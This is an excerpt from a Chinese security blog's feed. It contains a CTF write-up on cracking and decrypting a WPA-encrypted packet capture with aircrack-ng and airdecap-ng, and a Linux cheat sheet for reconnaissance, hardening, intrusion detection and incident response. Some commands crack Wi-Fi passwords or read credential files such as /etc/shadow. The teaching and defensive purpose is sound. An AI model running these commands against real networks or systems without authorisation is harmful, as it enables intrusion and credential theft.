        <content type="html"><![CDATA[<h2 id="0x00-恶臭的数据包"><a href="#0x00-恶臭的数据包" class="headerlink" title="0x00 恶臭的数据包"></a>0x00 恶臭的数据包</h2><ol><li>下载文件，解压打开是个流量包cacosmia.pcap，wireshark打开，协议是802.11，加密的流量包，找到SSID是mamawoxiangwantiequan</li><li><img src="/2019%E7%BA%A2%E5%B8%BD%E6%9D%AF%E4%B9%8B%E6%81%B6%E8%87%AD%E7%9A%84%E6%95%B0%E6%8D%AE%E5%8C%85/1.png" alt></li><li>使用kali的aircrack-ng，爆破cacosmia.pcap，命令：aircrack-ng ‘/root/4crypto/cacosmia.pcap’ -w /root/rockyou.txt，得密码12345678，（hashcat也行）</li><li><img src="/2019%E7%BA%A2%E5%B8%BD%E6%9D%AF%E4%B9%8B%E6%81%B6%E8%87%AD%E7%9A%84%E6%95%B0%E6%8D%AE%E5%8C%85/2.png" alt></li><li>解密pcap包方法一，通过wireshark提供的转化网址，只需输入ssid和密码就能将其转化为PSK值<br><a href="https://www.wireshark.org/tools/wpa-psk.html" target="_blank" rel="noopener">https://www.wireshark.org/tools/wpa-psk.html</a></li><li><img src="/2019%E7%BA%A2%E5%B8%BD%E6%9D%AF%E4%B9%8B%E6%81%B6%E8%87%AD%E7%9A%84%E6%95%B0%E6%8D%AE%E5%8C%85/3.png" alt></li><li>b42c77c0a8f4e6e99f851bed7b3f5a913caad442b96d5cd2a190e3f975b36d9f</li><li>wireshark打开cacosmia.pcap，编辑-首选项-protocols-IEEE 802.11-Edit</li><li><img src="/2019%E7%BA%A2%E5%B8%BD%E6%9D%AF%E4%B9%8B%E6%81%B6%E8%87%AD%E7%9A%84%E6%95%B0%E6%8D%AE%E5%8C%85/4.png" alt></li><li>方法二：使用kali自带的解密工具，命令：airdecap-ng -p 12345678 -e mamawoxiangwantiequan ‘/root/4crypto/cacosmia.pcap’</li><li><img src="/2019%E7%BA%A2%E5%B8%BD%E6%9D%AF%E4%B9%8B%E6%81%B6%E8%87%AD%E7%9A%84%E6%95%B0%E6%8D%AE%E5%8C%85/5.png" alt></li><li><img src="/2019%E7%BA%A2%E5%B8%BD%E6%9D%AF%E4%B9%8B%E6%81%B6%E8%87%AD%E7%9A%84%E6%95%B0%E6%8D%AE%E5%8C%85/6.png" alt></li><li>得到cacosmia-dec.pcap，打开，搜索flag</li><li><img src="/2019%E7%BA%A2%E5%B8%BD%E6%9D%AF%E4%B9%8B%E6%81%B6%E8%87%AD%E7%9A%84%E6%95%B0%E6%8D%AE%E5%8C%85/7.png" alt></li><li>导出到文件，文件-导出对象-HTTP-选中13.png，导出保存为png，使用kali的foremost分离图片</li><li><img src="/2019%E7%BA%A2%E5%B8%BD%E6%9D%AF%E4%B9%8B%E6%81%B6%E8%87%AD%E7%9A%84%E6%95%B0%E6%8D%AE%E5%8C%85/8.png" alt></li><li>有个压缩包，解压要密码</li><li><img src="/2019%E7%BA%A2%E5%B8%BD%E6%9D%AF%E4%B9%8B%E6%81%B6%E8%87%AD%E7%9A%84%E6%95%B0%E6%8D%AE%E5%8C%85/9.png" alt></li><li>继续追踪http流，session很奇怪</li><li><img src="/2019%E7%BA%A2%E5%B8%BD%E6%9D%AF%E4%B9%8B%E6%81%B6%E8%87%AD%E7%9A%84%E6%95%B0%E6%8D%AE%E5%8C%85/10.png" alt></li><li>JWT解码，得到提示，密码是之前访问过的网站</li><li><img src="/2019%E7%BA%A2%E5%B8%BD%E6%9D%AF%E4%B9%8B%E6%81%B6%E8%87%AD%E7%9A%84%E6%95%B0%E6%8D%AE%E5%8C%85/11.png" alt></li><li>找DNS记录，最终找到26rsfb.dnslog.cn是解压密码</li><li><img src="/2019%E7%BA%A2%E5%B8%BD%E6%9D%AF%E4%B9%8B%E6%81%B6%E8%87%AD%E7%9A%84%E6%95%B0%E6%8D%AE%E5%8C%85/12.png" alt></li><li>flag</li><li><img src="/2019%E7%BA%A2%E5%B8%BD%E6%9D%AF%E4%B9%8B%E6%81%B6%E8%87%AD%E7%9A%84%E6%95%B0%E6%8D%AE%E5%8C%85/13.png" alt></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> encrypt_decrypt </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux_信息搜集_安全加固_入侵检测_应急响应</title>
      <link href="/Linux-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA-%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
      <url>/Linux-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA-%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-Linux"><a href="#0x00-Linux" class="headerlink" title="0x00 Linux"></a>0x00 Linux</h2><p><img src="/Linux-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA-%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/1.jfif" alt></p><ol><li><strong>注意：</strong>直接复制命令执行命令，可能会报错或没回显预计的结果，因为特殊字符是中文字符，如单双引号</li></ol><h2 id="0x10-信息搜集"><a href="#0x10-信息搜集" class="headerlink" title="0x10 信息搜集"></a>0x10 信息搜集</h2><h3 id="0x11-系统信息"><a href="#0x11-系统信息" class="headerlink" title="0x11 系统信息"></a>0x11 系统信息</h3><ol><li><strong><a href="https://ipcmen.com/uname" target="_blank" rel="noopener">uname -a</a> #显示操作系统相关信息</strong></li><li>uname -r #内核版本</li><li>cat /proc/version #内核版本</li><li>hostname #主机名</li><li>cat /etc/*-release #查看系统信息</li><li>cat /etc/hosts #hosts文件</li><li>cat /proc/cpuinfo #查看CPU信息</li><li>lspci -tv #列出所有PCI设备1</li><li>lsusb -tv #列出所有USB设备</li><li>lsmod #列出加载的内核模块</li><li><strong>uptime #查看系统运行时间、用户数、负载</strong></li><li>dmesg #显示开机信息</li><li>runlevel #查看系统运行级别</li><li>telinit 5 #切换至level 5</li></ol><h3 id="0x12-用户信息"><a href="#0x12-用户信息" class="headerlink" title="0x12 用户信息"></a>0x12 用户信息</h3><ol><li><strong>cat /etc/passwd #列出所有用户</strong></li><li>用户名：口令：用户ID：组ID：用户描述：主目录：登录shell</li><li><strong>cat /etc/shadow #列出所有用户hash（root权限）</strong></li><li>登录名：加密口令：最后一次修改时间：最小时间间隔：最大时间间隔：警告时间：不活动时间：失效时间：标志</li><li><strong>cat /etc/group #列出系统所有组</strong></li><li>finger #当前登录的用户</li><li>finger root #查看root用户的基本信息</li><li>users #当前登录的用户</li><li>who -a #当前登录的用户的基本信息</li><li><strong>whoami #当前用户</strong></li><li>w #当前登入系统的用户和正在执行的程序</li><li>last #显示登入过系统的用户信息</li><li><strong>lastlog #显示系统中所有用户最近一次登录系统信息</strong></li><li>who -r #查看系统运行级别</li></ol><h3 id="0x13-用户权限信息"><a href="#0x13-用户权限信息" class="headerlink" title="0x13 用户权限信息"></a>0x13 用户权限信息</h3><ol><li><strong>id #显示用户的id、所属群组的id</strong></li><li><strong>cat /etc/sudoers #查看可以sudo提升到root的用户（root权限）</strong></li><li>sudo #允许普通用户执行一些或全部的root命令的工具</li><li><strong>sudo -l #列出当前的权限</strong></li><li>su root #切换到root用户，需要root密码</li><li>umask #查看建立文件目录时的权限掩码</li></ol><h3 id="0x14-环境信息"><a href="#0x14-环境信息" class="headerlink" title="0x14 环境信息"></a>0x14 环境信息</h3><ol><li>env #输出系统环境信息</li><li>set #设置shell，输出系统环境信息</li><li>echo $PATH #输出环境变量中的路径信息</li><li>history #执行命令历史记录</li><li>cat ~/.bash_history #读取执行命令的历史记录</li><li><strong>pwd #当前路径信息</strong></li><li>cat /etc/profile #/etc/profile是永久性，全局环境变量 </li><li>cat /etc/shells #显示可用的shell</li><li>free -m #查看内存使用量与交换区使用量</li><li><strong>df -h #查看各分区使用情况</strong></li><li><strong>du -sh &lt;目录名&gt; #查看指定目录的大小</strong></li><li>mount | column -t #查看挂接的分区状态</li><li><strong>fdisk -l #查看所有分区</strong></li><li>swapon -s #查看所有交换分区</li><li>export #用于设置或显示环境变量</li></ol><h3 id="0x15-服务任务进程"><a href="#0x15-服务任务进程" class="headerlink" title="0x15 服务任务进程"></a>0x15 服务任务进程</h3><ol><li>ps aux #查看进程信息</li><li>ps -ef #查看进程信息</li><li>top #实时显示进程（process）的动态</li><li>cat /etc/services #查看服务与对应的端口</li><li>ls -la /etc/cron* #计划任务</li><li><strong>crontab -l #显示用户的计划任务</strong></li><li><strong>service –status-all #显示所有服务的状态</strong></li><li><strong>cat /etc/services #查看端口服务映射</strong></li><li>chkconfig –list #列出所有系统服务</li><li>chkconfig –list | grep on #列出所有启动的系统服务</li></ol><h3 id="0x16-网络通信"><a href="#0x16-网络通信" class="headerlink" title="0x16 网络通信"></a>0x16 网络通信</h3><ol><li>ifconfig -a #列出网卡信息</li><li>cat /etc/network/interfaces #列出网络接口信息</li><li>cat /etc/networks #</li><li>dnsdomainname #</li><li><strong>arp -a #查看系统arp表</strong></li><li><strong>route #输出路由信息</strong></li><li>cat /etc/resolv.conf #查看DNS配置信息</li><li>netstat -lntp #查看所有监听端口 -l：listening，-n：不解析，-t：tcp，-p：显示pid/程序名</li><li><strong>netstat -antp #查看所有已经建立的连接</strong> -a：all，-n：不解析，-t：tcp，-p：显示pid/程序名</li><li>iptables -L #列出防火墙的配置规则</li><li>lsof #列出打开的文件</li></ol><h3 id="0x17-软件信息"><a href="#0x17-软件信息" class="headerlink" title="0x17 软件信息"></a>0x17 软件信息</h3><ol><li>dpkg -l #列出已安装的软件</li><li>rpm -qa #列出已安装的软件</li><li>httpd -v #查看apache版本</li><li>apache2 -v #查看apache版本</li><li>apache2ctl -M #查看Apache加载的模块</li><li>mysql –version #查看mysql版本</li><li>psql -V #查看postgresql版本</li><li>perl -v #查看perl版本</li><li>java -version #查看java版本</li><li>python –version #查看python版本</li></ol><h3 id="0x18-其他命令"><a href="#0x18-其他命令" class="headerlink" title="0x18 其他命令"></a>0x18 其他命令</h3><ol><li>find / -type d -name ‘python’ 2&gt;/dev/null #在根目录下找名为python的目录，去掉报错</li><li>which [filename] #在环境变量$PATH设置的目录里查符合条件的文件</li><li>locate [filename] #查找符合条件的文档</li><li>mount /dev/hda1 /mnt #将/dev/hda1挂载/mnt下</li><li>umount -v /dev/hda1 #通过设备名卸载</li><li>umount -v /mnt/hda1/ #通过挂载点卸载</li><li>more [filename] #一页一页读</li><li>tail #读文件最后几行</li><li>find . -type f | xargs grep “keyword” #查找目录下所有文件包含keyword的文件</li></ol><h3 id="0x19-参考链接"><a href="#0x19-参考链接" class="headerlink" title="0x19 参考链接"></a>0x19 参考链接</h3><p><a href="https://blog.csdn.net/Fly_hps/article/details/80541856" target="_blank" rel="noopener">https://blog.csdn.net/Fly_hps/article/details/80541856</a></p><h2 id="0x20-安全加固"><a href="#0x20-安全加固" class="headerlink" title="0x20 安全加固"></a>0x20 安全加固</h2><h3 id="0x21-账号安全"><a href="#0x21-账号安全" class="headerlink" title="0x21 账号安全"></a>0x21 账号安全</h3><p><strong>查看root权限账号</strong></p><ol><li>awk -F : ‘($3==0){print $1}’ /etc/passwd </li><li>鉴别其他非root的用户，保留？删除？锁定？注释(修改vim /etc/passwd，用户前面加#)？等等</li></ol><p><strong>查看登录权限的账号</strong></p><ol><li>awk -F : ‘($7==”/usr/sbin/nologin”){print $1}’ /etc/passwd </li></ol><p><strong>查看空密码的账号</strong></p><ol><li>查看文件/etc/passwd，第二个::之间为空的，即空密码</li><li>awk -F “:” ‘($2==””){print $1}’ /etc/shadow</li></ol><p><strong>添加用户</strong></p><ol><li>useradd username</li></ol><p><strong>设置密码</strong></p><ol><li>passwd username</li></ol><p><strong>拒绝系统用户登录</strong></p><ol><li>usermod -s/–shell /usr/sbin/nologin username</li><li>或者</li><li>usermod -s/–shell /bin/false username</li></ol><p><strong>锁定帐号</strong></p><ol><li>passwd -l/–lock username </li><li>还可以编辑/etc/passwd文件，在用户的shell后添加nologin</li><li>一般需要锁定的用户：lp,nuucp,hpdb,sync,adm</li></ol><p><strong>解锁账号</strong></p><ol><li>passwd -u/–unlock username</li></ol><p><strong>删除帐号</strong></p><ol><li>passwd -d/–delete username</li></ol><p><strong>添加（不能登录）账号</strong></p><ol><li>useradd -d /usr/local/apache -g apache -s /bin/false apache</li></ol><p><strong>设置密码策略</strong></p><ol><li>查看配置文件/etc/login.defs</li><li>PASS_MAX_DAYS 99999 #密码最长有效期，<strong>建议</strong>不大于90天</li><li>PASS_MIN_DAYS 6 #密码修改之间最小的天数，<strong>建议</strong>不小于6天</li><li>pass_MIN_LEN    8 #密码最小长度，<strong>建议</strong>不小于8位</li><li>PASS_WARN_AGE 7 #密码过期前几天开始提示用户修改密码，<strong>建议</strong>30天左右，小于最长有效期</li></ol><p><strong>设置用户密码强度</strong></p><ol><li>设置配置文件/etc/pam.d/sysetm-auth（centos）、/etc/pam.d/common-password（Ubuntu）</li><li>至少一个数字，一个小写字母，一个大写字母，一个特殊字符，长度至少8位</li><li><img src="/Linux-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA-%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/9.png" alt></li></ol><p><strong>设置限制用户的登录次数</strong></p><ol><li>查看配置文件/etc/pam.d/sshd/</li><li>auth required pam_tally2.so deny=3 unlock_time=150 even_deny_root root_unlock_time=300 #无就新加，错误输入3次就锁定，锁定时间为150秒，若用户为root，则锁定300秒</li><li>pam_tally2 #查看被锁定的用户</li><li>pam_tally2 –reset -u [username] #将锁定的用户解锁</li></ol><p><strong>禁止root用户远程登录SSH</strong></p><ol><li>查看配置文件/etc/ssh/sshd_config </li><li>PermitRootLogin no #如果为yes，改为no</li><li><strong>脚本设置：</strong>（有风险，慎用）</li><li>#!/bin/bash</li><li>sed -i ‘/PermitRootLogin/c\PermitRootLogin no’ /etc/ssh/sshd_config</li><li><strong>不允许用户密码登录</strong></li><li>PasswordAuthentication no #前面有#，代表注释这行，去掉，如果为yes，则改为no</li><li><strong>添加IP白名单</strong></li><li>修改配置/etc/ssh/sshd_config</li><li>添加：AllowUsers *@10.100.*.*  #表示只允许10.100.0.0/16网段用户通过ssh登录</li></ol><p><strong>设置访问ip的白名单与黑名单</strong></p><ol><li>例如允许ssh登录的ip</li><li>vim /etc/hosts.allow</li><li><img src="/Linux-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA-%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/13.png" alt></li><li><img src="/Linux-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA-%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/14.png" alt></li><li>禁止ssh登录的ip</li><li>vim /etc/hosts.deny</li><li><img src="/Linux-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA-%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/10.png" alt></li><li><img src="/Linux-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA-%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/11.png" alt></li><li><img src="/Linux-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA-%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/12.png" alt></li></ol><p><strong>设置主动注销</strong></p><ol><li>查看配置文件/etc/profile</li><li>cat /etc/profile | grep TMOUT | awk -F[=] ‘{print $2}’ #若无，则自主添加</li><li>配置文件/etc/profile底添加：TMOUT=300</li></ol><p><strong>历史命令保留数</strong></p><ol><li>设置配置文件/etc/profile</li><li>HISTSIZE=1000 #设置历史命令条数为1000</li></ol><p><strong>限制只有wheel组才能su</strong></p><ol><li>查看配置/etc/pam.d/su</li><li>是否存在配置：auth required pam_wheel.so</li><li>无则添加：</li><li>auth    required pam_wheel.so use_uid</li><li>auth sufficient pam_rootok.so</li><li>或添加：</li><li>auth required pam_wheel.so group=wheel</li><li>将用户test添加到wheel组</li><li>usermod -G wheel test</li></ol><h3 id="0x22-文件安全"><a href="#0x22-文件安全" class="headerlink" title="0x22 文件安全"></a>0x22 文件安全</h3><p><strong>设置初始文件的权限</strong></p><ol><li>查看命令：</li><li><img src="/Linux-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA-%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/1.png" alt></li><li>修改umask：</li><li>在/etc/profile设置umask 027（若无，则最后添加）</li><li>027对应权限为750，创建文件的用户有读写执行权限，同组用户有读执行权限，其他用户无权限。</li></ol><p><strong>锁定重要文件</strong></p><ol><li>重要文件：/etc/passwd、/etc/shadow、/etc/group、/etc/gshadow等等</li><li>ls -l /etc/passwd #建议权限为644</li><li>ls -l /etc/shadow #建议权限为400</li><li>ls -l /etc/group #建议权限为644</li><li>ls -l /etc/services #建议权限为644</li><li>ls -l /etc/login.defs #建议权限为644</li><li>ls -l /etc/ssh/ssh_config #建议权限为600</li><li>ls -l /etc/security/ #建议权限为600</li><li>chattr +i /etc/passwd #+i，表示文件不允许新增、删除、修改、改名、链接关系等</li><li>解锁：chattr -i /etc/passwd</li><li>lsattr：用来显示文件或目录的属性的</li><li>chattr +a /var/log/messages #只能追加数据，不能删除日志文件</li></ol><p><strong>防止ip欺骗</strong></p><ol><li>/etc/host.conf文件</li><li>order hosts,bind #先通过hosts文件解析，再DNS解析ip地址（也可以相反）</li><li>multi on #指定是否/etc/hosts文件中指定的主机可以有多个地址</li><li>ospoof on #指不允许对该服务器进行IP地址欺骗。IP欺骗是一种攻击系统安全的手段，通过把IP地址伪装成别的计算机，来取得其它计算机的信任。</li></ol><p><strong>禁止非root用户执行/etc/init.d/里的系统命令</strong></p><h3 id="0x23-日志安全"><a href="#0x23-日志安全" class="headerlink" title="0x23 日志安全"></a>0x23 日志安全</h3><ol><li>/var/log/messages #几乎所有的开机系统发生的错误都会在此记录，建议640</li><li>/var/log/syslog #事件记录监控程序日志</li><li>/var/log/lastlog #记录每个用户最后的登录信息</li><li>/var/log/auth.log #用户认证日志</li><li>/var/log/daemon.log #系统进程日志</li><li>/var/log/kern.log #内核产生的信息</li></ol><p><strong>建立日志服务器</strong></p><ol><li>日志服务器配置文件：/etc/rsyslog.conf</li><li><strong>服务器：</strong></li><li>ipaddr：192.168.100.4</li><li>netmask：255.255.255.0</li><li>bootproto：static</li><li><strong>客户端：</strong></li><li>ipaddr：192.168.100.15</li><li><strong>服务器配置：</strong></li><li>设置配置文件：TCP/UDP任选一个</li><li><img src="/Linux-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA-%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/2.png" alt></li><li>创建设置文件，配置需要监控的客户端</li><li><img src="/Linux-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA-%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/3.png" alt></li><li>fromhost-ip 哪个ip发过来的</li><li>isequal 等于</li><li>保存退出，重启日志服务：</li><li><img src="/Linux-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA-%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/5.png" alt></li><li><img src="/Linux-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA-%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/6.png" alt></li><li><strong>客户端配置：</strong></li><li>设置配置文件：vim /etc/rsyslog.conf</li><li><img src="/Linux-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA-%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/4.png" alt></li><li>保存退出，重启日志服务：</li><li>systemctl restart rsyslog #centos7</li><li></li><li><strong>验证日志服务器：</strong></li><li>ssh登录测试</li><li><img src="/Linux-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA-%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/7.png" alt></li><li><img src="/Linux-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA-%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/8.png" alt></li></ol><h3 id="0x24-禁ping"><a href="#0x24-禁ping" class="headerlink" title="0x24 禁ping"></a>0x24 禁ping</h3><ol><li>echo 1 &gt; /proc/sys/net/ipv4/icmp_echo_ignore_all #开启</li><li>echo 0 &gt; /proc/sys/net/ipv4/icmp_echo_ignore_all #关闭</li><li><img src="/Linux-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA-%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/17.png" alt></li></ol><h3 id="0x25-预防flood攻击"><a href="#0x25-预防flood攻击" class="headerlink" title="0x25 预防flood攻击"></a>0x25 预防flood攻击</h3><ol><li>关键字：DDoS攻击、TCP_SYN flood、半开式连接攻击、拒绝服务攻击</li><li>原理：利用TCP协议实现上的缺陷，通过向网络服务器的端口发送大量的伪造源地址的攻击报文，造成目标服务器中的半开连接队列占满，从而阻止其他合法用户的访问。</li><li>通俗讲：一次标准的TCP连接，有三次握手，而TCP_SYN Flood实现过程就只有前两步骤，服务器就会在一定时间内等待接收客户端的ACK消息的状态。服务器的可用的TCP连接是有限的。</li><li><img src="/Linux-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA-%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/15.png" alt></li><li>vim /etc/sysctl.conf</li><li><img src="/Linux-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA-%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/16.png" alt></li><li>sysctl -p    #使上面配置生效</li></ol><h3 id="0x26-NTP服务放大攻击"><a href="#0x26-NTP服务放大攻击" class="headerlink" title="0x26 NTP服务放大攻击"></a>0x26 NTP服务放大攻击</h3><p><a href="https://www.cnblogs.com/kevingrace/p/6756515.html" target="_blank" rel="noopener">https://www.cnblogs.com/kevingrace/p/6756515.html</a></p><h3 id="0x27-通用简单预防DDOS"><a href="#0x27-通用简单预防DDOS" class="headerlink" title="0x27 通用简单预防DDOS"></a>0x27 通用简单预防DDOS</h3><ol><li>关闭不必要的服务或端口</li><li>禁止对主机非开放服务的访问</li><li>及时安装系统补丁</li><li>限制同一时间内打开的syn半连接数目</li><li>缩短syn半连接的超时时间</li><li>启用Linux自带的防火墙防DDOS属性</li><li>安装相应的防护软件</li><li>购买DDOS防御产品</li></ol><h3 id="0x28-参考链接"><a href="#0x28-参考链接" class="headerlink" title="0x28 参考链接"></a>0x28 参考链接</h3><p><a href="https://blog.csdn.net/qq_36119192/article/details/82906799" target="_blank" rel="noopener">https://blog.csdn.net/qq_36119192/article/details/82906799</a><br><a href="https://www.cnblogs.com/kevingrace/p/6756515.html" target="_blank" rel="noopener">https://www.cnblogs.com/kevingrace/p/6756515.html</a></p><h2 id="0x30-入侵检测"><a href="#0x30-入侵检测" class="headerlink" title="0x30 入侵检测"></a>0x30 入侵检测</h2><h3 id="0x31-入侵痕迹搜集命令"><a href="#0x31-入侵痕迹搜集命令" class="headerlink" title="0x31 入侵痕迹搜集命令"></a>0x31 入侵痕迹搜集命令</h3><ol><li><strong>检查用户</strong></li><li>last #查看登入过系统的用户信息</li><li>lastb #查看登录失败的用户信息</li><li>lastlog #查看所有用户的最近一次登录信息</li><li>who #查看当前登录系统的用户情况，以及正在执行的程序</li><li>w #查看当前登录系统的用户情况，以及正在执行的程序</li><li>history #查看执行命令历史记录</li><li>ls -l [filename] #查看文件最后修改时间</li><li>awk -F : ‘($3==0){print $1}’ /etc/passwd #查看是否存在其他特权用户（除root之外）</li><li>awk -F : ‘length($2)==0 {print $1}’ /etc/shadow #查看是否存在空口令的用户</li><li><strong>检查进程</strong></li><li>top #实时显示进程（process）的动态</li><li>ps -aux #查看当前进程 (process) 的状态</li><li>lsof -p pid #查看进程所打开文件</li><li>lsof -i:port #查看端口对应的进程</li><li>ls -l /proc/{pid}/exe #获取绝对路径下的文件</li><li><strong>查看隐藏进程</strong></li><li>ps -aux –sort=-pcpu|head -10 #查看隐藏进程</li><li><strong>检查文件</strong></li><li>stat filename #查看文件的修改时间、大小、权限等信息</li><li>find / -uid 0 -print #查看有特权用户的文件</li><li>find / -name “…” -prin #查看用户名为…的文件</li><li>md5sum -b filename #查看文件的MD5值</li><li>whereis filename #查看文件的路径</li><li>ls -l filename -h #查看文件大小</li><li>du -sh filename #查看文件大小</li><li><strong>检查网络</strong></li><li>top #实时显示进程（process）的动态</li><li>netstat -antp #查看所有已经建立的连接</li><li>netstat -lntp #查看所有监听端口</li><li>ifconfig -a #列出网卡信息</li><li>arp -a #查看系统arp表</li><li><strong>检查计划任务</strong></li><li>crontab -l #列出计划任务</li><li>cat /etc/crontab #检查计划任务文件</li><li>ls -l /etc/cron.* #查看cron文件是否变化的详细信息</li><li><strong>检查后门</strong></li><li>cat $HOME/.ssh/authorized_keys #查看ssh永久链接文件</li><li>lsmod #检查内核模块</li><li>chkconfig –list #检查自启动</li><li>systemctl list-units -type=service –all #检查自启动</li><li>ls /etc/rc[n].d #</li><li>find / -name “.rhosts” -print</li><li>find / -name “.forward” -print</li></ol><p><a href="https://blog.csdn.net/weixin_44335190/article/details/91353637" target="_blank" rel="noopener">https://blog.csdn.net/weixin_44335190/article/details/91353637</a><br><a href="https://blog.csdn.net/itcast_cn/article/details/80096103" target="_blank" rel="noopener">https://blog.csdn.net/itcast_cn/article/details/80096103</a><br><a href="https://www.cnblogs.com/sanduo1314/p/7458415.html" target="_blank" rel="noopener">https://www.cnblogs.com/sanduo1314/p/7458415.html</a><br><a href="https://www.secpulse.com/archives/116824.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/116824.html</a><br><a href="https://www.cnblogs.com/canyezhizi/p/11194177.html" target="_blank" rel="noopener">https://www.cnblogs.com/canyezhizi/p/11194177.html</a></p><h2 id="0x40-应急响应"><a href="#0x40-应急响应" class="headerlink" title="0x40 应急响应"></a>0x40 应急响应</h2><h3 id="0x41-常见命令"><a href="#0x41-常见命令" class="headerlink" title="0x41 常见命令"></a>0x41 常见命令</h3><ol><li>top #实时显示进程（process）的动态</li><li>ps -aux | grep [keyword] #列出所有相关keyword的进程</li><li>lsof -p pid #查看进程所打开文件</li><li>lsof -i:port #查看端口对应的进程</li><li>ls -l /proc/{pid}/exe #获取绝对路径下的文件</li><li>netstat -antp #查看所有已经建立的连接</li><li>netstat -lntp #查看所有监听端口</li><li>last #查看最近登录的用户信息</li><li>crontab -l #列出计划任务</li><li>cat ~/.bash_history #查看历史命令</li><li>cat /etc/passwd #查看可疑账号</li><li>ls -alt #查看隐藏文件</li><li><strong>敏感目录</strong></li><li>/tmp #临时文件</li><li>/usr/sbin，/bin #命令所在目录</li><li>/etc/init.d #开机启动目录</li><li><strong>敏感文件</strong></li><li>/etc/rc.local #开机启动文件</li><li>/root/.bash_history #历史命令文件</li><li>/etc/passwd，/etc/shadow #用户账户信息</li><li>/etc/cron* #计划任务文件</li></ol><h3 id="0x42-安全工具"><a href="#0x42-安全工具" class="headerlink" title="0x42 